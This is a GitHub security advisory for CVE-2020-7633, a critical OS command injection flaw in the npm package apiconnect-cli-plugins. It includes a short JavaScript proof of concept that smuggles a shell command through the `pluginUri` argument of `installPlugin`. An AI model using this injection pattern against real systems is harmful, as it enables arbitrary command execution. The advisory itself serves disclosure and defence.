# [C] apiconnect-cli-plugins vulnerable to OS Command Injection

## Summary
Severity: Critical
Advisory: GHSA-c9m9-48pw-6mpv
CVE: CVE-2020-7633
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2021-05-24
Source: https://github.com/advisories/GHSA-c9m9-48pw-6mpv
Type: github-advisory

## Affected
- npm: `apiconnect-cli-plugins` — affected >=0

## Details
apiconnect-cli-plugins through 6.0.1 is vulnerable to Command Injection. It allows execution of arbitrary commands via the `pluginUri` argument.

### PoC
```js
var root = require("apiconnect-cli-plugins");
var payload = "& touch Song &";
root.pluginLoader.installPlugin(payload, "");
```

The injection point is located in line 181 of file `lib/plugin-loader.js`, in the function `installPlugin(pluginUri, registryUri)`.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-7633
- https://openbase.com/js/apiconnect-cli-plugins
- https://snyk.io/vuln/SNYK-JS-APICONNECTCLIPLUGINS-564427
- https://web.archive.org/web/20211209115530/https://openbase.com/js/apiconnect-cli-plugins
